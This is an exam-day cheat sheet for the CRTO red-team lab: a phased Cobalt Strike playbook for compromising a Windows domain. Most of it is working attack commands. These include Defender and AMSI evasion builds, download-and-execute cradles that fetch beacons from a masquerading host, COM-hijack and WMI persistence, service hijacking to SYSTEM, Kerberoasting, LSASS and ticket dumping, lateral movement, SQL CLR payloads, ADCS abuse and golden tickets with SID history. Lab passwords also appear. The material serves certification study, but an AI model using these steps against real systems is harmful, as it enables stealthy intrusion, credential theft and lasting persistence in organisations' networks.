# CRTO Exam Day — Fast Reference Methodology

> Execute phases in order. Set persistence before moving laterally. OPSEC score = 50 pts — never disable Defender, never use default CS indicators.

---

## Phase 0 — CS Team Server Initial Connect (Attacker Host)

Start here before touching any target. All evasion must be in place before first beacon.

```bash
# SSH to team server
ssh attacker@10.0.0.5                          # Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile                           # paste stage, post-ex, process-inject blocks

# Validate profile — fix any [!] before restarting
/opt/cobaltstrike/c2lint /opt/cobaltstrike/profiles/default.profile
sudo /usr/bin/docker restart cobaltstrike-cs-1
sudo /usr/bin/docker logs cobaltstrike-cs-1    # confirm no [!] errors
```

**CS GUI — listeners to create:**
```
HTTP listener:  Host = www.bleepincomputer.com, Port = 80
SMB listener:   Pipename = <CUSTOM — NOT TSVCPIPE-*> (e.g. wkssvc-<guid>)
DNS listener:   (for elevated persistence — WMI)
TCP-local:      Port 1337 (for SQL/isolated segments)
```

**OPSEC-SAFE** — all profile setup; no target contact yet.

---

## Phase 1 — Defence Evasion: Malleable C2 & Artifact/Resource Kit

Bypass Defender at every layer before generating any payload.

```bash
# WSL — Build Artifact Kit (patch decryption loop to backward while)
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
# Edit src-common/patch.c lines ~45 and ~116 → backward while loop
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

# ThreatCheck — must be clean before loading
ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"

# WSL — Build Resource Kit
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
# VSCode: fix template.x64.ps1 line 5: .Equals('Sys'+'tem.dll')
# VSCode: fix template.x64.ps1 line 32: replace Marshal.Copy with WriteProcessMemory
# VSCode: replace compress.ps1 with obfuscated Invoke-Obfuscation version

# ThreatCheck AMSI — must show "No threat found"
ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

```
# CS Script Manager → Load both:
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
C:\Tools\cobaltstrike\custom-resources\resources.cna
```

**After first beacon checks in:**
```cs
beacon> ps                                         // check for EDR, find explorer PID
beacon> ppid <explorer.exe PID>                    // OPSEC-SAFE — spoof parent
beacon> spawnto x64 %windir%\sysnative\werfault.exe
```

---

## Phase 2 — AppLocker Bypass (Initial Workstation)

If `$ExecutionContext.SessionState.LanguageMode` returns `ConstrainedLanguage`, AppLocker is enforcing.

```powershell
# Confirm ConstrainedLanguage
$ExecutionContext.SessionState.LanguageMode

# Check if DLL rules are ON — empty = DLL enforcement OFF = rundll32 viable
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable paths under %WINDIR%\* (covered by default allow rule)
icacls C:\Windows\Tasks    # Authenticated Users:(RX,WD) — writable
```

```powershell
# Download beacon DLL from CS web server (IWR works in ConstrainedLanguage)
Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'

# Execute via rundll32 (OPSEC-CAUTION — EDR-visible but AppLocker compliant)
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

---

## Phase 3 — Initial Access

Assume-breach: you have creds for the foothold workstation. No phishing needed on exam day.

```powershell
# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-SAFE)
cd C:\Payloads\deals
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
# Beacon appears from msedge.exe
```

**Alternative — Scripted Web Delivery (if AppDomainHijack not needed):**
```powershell
iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
```

**Verify first beacon:**
```cs
beacon> getuid
beacon> getpid
beacon> ps             // confirm beacon is inside msedge.exe, check for EDR
```

---

## Phase 4 — Persistence (User-Level — no admin required)

Deploy immediately after first beacon. Do this before privesc or lateral movement.
Technique: COM hijack via Microsoft Teams (`HKCU` — no admin, beacon inside `ms-teams.exe`).

```cs
// Generate DLL payload — Exit Function: Thread
// Payloads > Windows Stageless Payload > http > Windows DLL > Thread

// In beacon running as target user:
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll Microsoft.Teams.HttpClient.dll
beacon> timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

Teams restart triggers DLL load → new beacon from `ms-teams.exe`.

---

## Phase 5 — Privilege Escalation

Exploit weak service registry permissions → SYSTEM beacon.

```cs
// Enumerate services where low-priv users have FullControl (OPSEC-SAFE — powerpick)
beacon> powerpick $lowpriv = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value; Rights=$ace.RegistryRights}}}}
// Returns: BadWindowsService

// Set spawnto for service payload before generating
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

// Payloads > Windows Stageless Payload > http > Windows Service EXE → http_x64.svc.exe

beacon> sc_stop BadWindowsService
beacon> cd C:\Temp
beacon> upload C:\Payloads\http_x64.svc.exe
beacon> sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
beacon> sc_start BadWindowsService
// Elevated SYSTEM beacon appears

// Restore service (clean up)
beacon> sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
beacon> rm http_x64.svc.exe
beacon> sc_start BadWindowsService
```

---

## Phase 6 — Elevated Persistence (SYSTEM-Level — requires elevated beacon)

WMI event subscription triggers on GPO refresh — survives reboots, no user interaction.

```cs
// On SYSTEM beacon:
// Generate DNS payload → Payloads > Windows Stageless Payload > dns > exe → dns_x64.exe
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe windbg.exe

// Install WMI subscription (triggers on Event 1502 = GPO refresh)
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence

// Trigger manually to verify
beacon> execute gpupdate /target:computer /force
// New DNS beacon appears within seconds

// Cleanup (after exam — or before submit if instructed)
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
```

**OPSEC-CAUTION** — WMI subscription creation logged; use generic names in the script (`Debug Trace`, `Debug Consumer`) to blend with legitimate WMI activity.

---

## Phase 7 — Credential Access

Target: dump credentials without touching LSASS directly. Prefer Rubeus/BOF over Mimikatz.

```cs
// Kerberoasting — OPSEC-SAFE (in-memory, no LSASS touch)
// First enumerate SPNs to avoid honeypot accounts
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName

// Kerberoast specific account only (avoid honeypots)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// AS-REP Roasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

// LSASS dump — BOF method (OPSEC-SAFE relative to Mimikatz direct)
beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp

// Triage + dump Kerberos tickets (BOF — no LSASS raw read)
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt
```

**Hashcat offline crack:**
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt   # Kerberoast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # AS-REP
```

---

## Phase 8 — User Impersonation

Impersonate a user via their Kerberos TGT without knowing their password.

```cs
// Load BOF script first (one-time):
// Cobalt Strike > Script Manager > Load > C:\Tools\Kerbeus-BOF\kerbeus_cs.cna

beacon> krb_triage                                    // find rsteel's krbtgt ticket
beacon> krb_dump /user:rsteel /service:krbtgt         // dump TGT (base64 output)

// Save kirbi to disk (run in PowerShell on attacker desktop)
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))

// Create sacrificial logon session and inject ticket
beacon> make_token CONTOSO\rsteel FakePass            // fake password — never validated
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
beacon> run klist                                     // verify ticket loaded

// Verify access
beacon> ls \\lon-ws-1\c$

// Drop impersonation
beacon> rev2self
```

**Alternative — steal token from running process (preferred when process exists):**
```cs
beacon> process_browser                               // find rsteel's process PID
beacon> steal_token <pid>                             // OPSEC-SAFE — in-process token dupe
```

---

## Phase 9 — Discovery (OPSEC-SAFE LDAP via BOF)

All `ldapsearch` commands run as BOFs — no child process, no disk write.

```cs
// Domain structure + GPOs
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor

// Users + computers + groups
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

// BloodHound — copy logs from team server and parse with BOFHound
// Ubuntu WSL on attacker desktop:
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .    # Password: Passw0rd!
bofhound -i logs
// Load JSON output into BloodHound (http://localhost:8080)

// Key BloodHound Cypher queries
Match (n:GPO) return n                                // find GPOs
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer{name:"LON-DC-1.CONTOSO.COM"})) return p
```

---

## Phase 10 — Lateral Movement

Use highest-OPSEC method that works. Impersonate before moving.

```cs
// Test WinRM reachability first
beacon> powerpick Test-WSMan lon-ws-1

// Option 1 — WinRM (OPSEC-SAFE — preferred)
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump winrm64 lon-ws-1 smb

// Option 2 — SCShell (OPSEC-CAUTION — no Event 7045, modifies existing service)
// CS > Script Manager > Load > C:\Tools\SCShell\CS-BOF\scshell.cna
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump scshell64 lon-ws-1 smb

// Option 3 — WMI (OPSEC-CAUTION — no service, no 7045)
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe

// Option 4 — psexec (OPSEC-UNSAFE — LAST RESORT — generates Event 7045)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump psexec64 lon-ws-1 smb

beacon> rev2self     // drop impersonation after lateral move succeeds
```

**Decision flow:** `winrm64` → `scshell64` → `remote-exec wmi` → `psexec64` (last resort only).

---

## Phase 11 — SOCKS Pivoting

Tunnel attacker-desktop tools through a beacon into isolated network segments.

```cs
// Start SOCKS5 proxy (no admin needed — run from medium-integrity beacon)
beacon> socks 1080 socks5
```

```powershell
# Attacker desktop — add hosts file entry for internal DNS resolution
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

```
# Proxifier: Profile > Proxy Servers > Add
  Address: 10.0.0.5 | Port: 1080 | SOCKS5
# Proxification Rules > Add
  Name: Beacon | Target hosts: 10.10.120.0/23 | Action: Proxy SOCKS5 10.0.0.5
```

```powershell
# LDAP service ticket via SOCKS (proxified netonly session)
runas /netonly /user:CONTOSO\rsteel powershell.exe       # Password: FakePass
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
Get-ADUser -Filter * -Server lon-dc-1                    # enumerate via SOCKS
```

---

## Phase 12 — Kerberos Attacks

### Kerberoasting / AS-REP Roasting → see Phase 7

### Unconstrained Delegation

```cs
// Enumerate hosts with unconstrained delegation (DCs excluded from attack path)
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

// Move to unconstrained delegation host (lon-ws-1), then:
beacon> krb_triage                              // harvest cached TGTs (passive)
beacon> ldapsearch samAccountName=dyork --attributes memberOf  // confirm DA
beacon> krb_dump /luid:<LUID> /service:krbtgt   // dump DA TGT

// Coerce authentication (active — if no cached TGT)
// SpoolSample / PetitPotam to force DC auth to unconstrained delegation host
// Then krb_triage again to catch the DC's TGT
```

### Constrained Delegation (with Protocol Transition)

```cs
// Enumerate hosts with msDS-AllowedToDelegateTo set
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

// Move to constrained delegation host (lon-ws-1), dump machine TGT
beacon> krb_triage
beacon> krb_dump /luid:3e7 /service:krbtgt     // 3e7 = SYSTEM LUID

// S4U abuse — get service ticket impersonating Administrator
beacon> krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
beacon> ls \\lon-fs-1\c$
```

### RBCD (Resource-Based Constrained Delegation)

```cs
// Requires: WriteProperty on target computer object
// Setup via SOCKS + Proxifier + PowerView/Impacket
// 1. Create a new machine account (Impacket addcomputer.py via proxychains)
// 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer to new machine SID
// 3. S4U2Proxy from new machine to get service ticket as DA
beacon> krb_s4u /ticket:[machine TGT] /service:cifs/<target> /impersonateuser:Administrator
```

### Service Name Substitution (S4U2self abuse)

```cs
// Useful when you have a service TGT but need a different service class
// Substitute the service name in the ticket SPN without re-requesting
beacon> krb_s4u /ticket:[TGT] /service:host/<target> /impersonateuser:Administrator
```

---

## Phase 13 — SQL Servers

```cs
// Load SQL-BOF: Cobalt Strike > Script Manager > Load > C:\Tools\SQL-BOF\SQL\SQL.cna

// Enumerate SQL servers via LDAP SPN query (OPSEC-SAFE)
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName

beacon> sql-info lon-db-1
beacon> sql-whoami lon-db-1           // check current privilege level

// Enumerate SQL admin group members
beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member

// Impersonate sysadmin user → steal token or inject ticket
beacon> steal_token <rsteel-pid>
beacon> sql-whoami lon-db-1           // should now show sysadmin

// Enable CLR + deploy CLR payload (builds MyProcedure.dll with embedded SMB shellcode)
beacon> sql-enableclr lon-db-1
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure

// Link to SQL beacon (run from pchilds beacon — auto-requests CIFS ticket)
beacon> link lon-db-1 <SMB-PIPENAME>

// Lateral movement via SQL linked server
beacon> sql-links lon-db-1
beacon> sql-whoami lon-db-1 "" lon-db-2
beacon> sql-enablerpc lon-db-1 lon-db-2
beacon> sql-clr lon-db-1 C:\...\MyProcedure.dll MyProcedure "" lon-db-2
// From lon-db-1 beacon:
beacon> link lon-db-2 <SMB-PIPENAME>

// Privilege escalation via SeImpersonatePrivilege (SweetPotato)
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
beacon> connect localhost 1337        // link to SYSTEM beacon

// Clean up
beacon> sql-disableclr lon-db-1
beacon> sql-disablerpc lon-db-1 lon-db-2
```

---

## Phase 14 — ADCS Attacks

### ESC1 — Misconfigured Client Authentication Template

```cs
// Enumerate vulnerable templates
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// Request cert with Administrator UPN in SAN
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet

// Use cert to get Administrator TGT via PKINIT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap

// Inject TGT and verify DA access
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64]
beacon> ls \\lon-dc-1\c$
```

### ESC8 — NTLM Relay to ADCS HTTP Endpoint

```cs
// Enumerate CA for ESC8 (HTTP endpoint, NTLM auth enabled)
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

// Start SOCKS proxy
beacon> socks 1080 socks5

// Stop SMB to free port 445 for relay
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet

// Redirect port 445 to attacker desktop (relay listener)
beacon> rportfwd_local 445 localhost 7445
beacon> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445

// On Kali (via Docker + proxychains):
// ntlmrelayx.py → relay DC auth → ADCS HTTP → obtain DC cert
// Rubeus.exe asktgt /certificate:<dc-cert> → DC TGT → DCSync
```

---

## Phase 15 — Domain Trusts (Parent-Child)

Hop from child domain (DUBLIN) to parent domain (CONTOSO) via SID history injection.

```cs
// Enumerate trust
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
// trustDirection=3 BIDIRECTIONAL | trustAttributes=32 WITHIN_FOREST

// Get child domain SID
beacon> ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid

// Get parent Enterprise Admins SID
beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid

// DCSync child domain krbtgt (from child DA beacon)
beacon> dcsync dublin.contoso.com DUBLIN\krbtgt    // OPSEC-CAUTION — logged on DC

// Forge golden ticket with SID history → Enterprise Admins of parent
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:<child-SID> /sids:<parent-EA-SID> /aes256:<krbtgt-hash> /outfile:C:\Users\Attacker\Desktop\golden

// Inject and access parent domain DC
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

---

## Phase 16 — Forest Trusts

### Inbound Trust (we are trusted — our users can access foreign domain resources)

```cs
// Confirm inbound trust from CONTOSO (trustDirection=1 INBOUND = PARTNER trusts us)
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// DCSync rsteel (who has access to PARTNER via FSP group membership)
beacon> dcsync CONTOSO\rsteel

// Authenticate to PARTNER domain using rsteel's AES256 hash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<hash> /nowrap /opsec

// Request cross-realm TGT for PARTNER
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/PARTNER.COM /ticket:[CONTOSO-TGT] /dc:lon-dc-1 /nowrap

// Request service ticket in PARTNER (e.g. cifs/par-jmp-1)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /ticket:[PARTNER-TGT] /dc:par-dc-1 /nowrap /ptt

// Access PARTNER resource
beacon> ls \\par-jmp-1\c$
```

### Outbound Trust (we are trusting — we can enumerate the trusted domain)

```cs
// Confirm outbound trust (trustDirection=2 OUTBOUND = we trust CONTOSO)
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// Get TDO object GUID (needed to DCSync a non-user object)
beacon> ldapsearch "(&(objectClass=trustedDomain)(trustPartner=contoso.com))" --attributes objectGuid

// DCSync the TDO to extract the inter-realm trust key
beacon> dcsync PARTNER\<TDO-GUID>                     // extracts RC4/AES trust key

// Authenticate as PARTNER$ to CONTOSO KDC using the trust key
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /rc4:<trust-key> /dc:lon-dc-1 /nowrap

// Enumerate CONTOSO via the trust TGT
beacon> make_token CONTOSO\PARTNER$ FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\partner-trust.kirbi
beacon> ldapsearch (samAccountType=805306368) --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName
```

---

## Exam Day Quick-Fire Commands

```
OPSEC TIERS:
  SAFE:    inline-execute, ldapsearch, powerpick, steal_token, jump winrm64, krb_triage, krb_dump
  CAUTION: execute-assembly, dcsync, make_token, sc_stop/start, sql-clr, kerberos_ticket_use
  UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct

SITUATIONAL AWARENESS:
  beacon> getuid | getpid | ps | ppid <PID> | spawnto x64 %windir%\sysnative\werfault.exe

CREDENTIAL HARVEST:
  Kerberoast:   execute-assembly Rubeus.exe kerberoast /user:<svc> /nowrap
  AS-REP:       execute-assembly Rubeus.exe asreproast /format:hashcat
  TGT dump:     krb_dump /user:rsteel /service:krbtgt
  Token:        steal_token <pid>

LATERAL (preference order):
  jump winrm64 <target> smb  →  jump scshell64 <target> smb  →  remote-exec wmi  →  jump psexec64 (last resort)

DCSYNC (CAUTION — logged on DC):
  beacon> dcsync CONTOSO\krbtgt
  beacon> dcsync CONTOSO\Administrator

PERSISTENCE:
  User-level:   COM hijack HKCU → Teams DLL (Phase 4)
  SYSTEM-level: WMI subscription → DNS beacon on gpupdate (Phase 6)

INJECT TGT:
  make_token DOMAIN\user FakePass  →  kerberos_ticket_use <path>.kirbi  →  rev2self

CLEANUP:
  rev2self | rm <kirbi-files> | sql-disableclr | sql-disablerpc
```

---

## Pre-Exam Go/No-Go Checklist

```
[ ] SSH to team server — Malleable C2 profile loaded (c2lint + docker logs clean)
[ ] Artifact Kit rebuilt + ThreatCheck clean (no output)
[ ] Resource Kit rebuilt + ThreatCheck AMSI clean ("No threat found")
[ ] artifact.cna + resources.cna loaded in CS Script Manager
[ ] HTTP listener live with masquerading Host header
[ ] SMB listener live with CUSTOM pipename (not TSVCPIPE-*)
[ ] Test beacon from workstation → Defender does NOT block
[ ] spawnto set to werfault.exe after first beacon
[ ] ppid set to explorer.exe PID
[ ] Read exam rules of engagement — identify off-limit hosts BEFORE touching anything
[ ] Persistence deployed before first break (COM hijack → WMI after privesc)
[ ] Never disable Defender or Windows Firewall
```
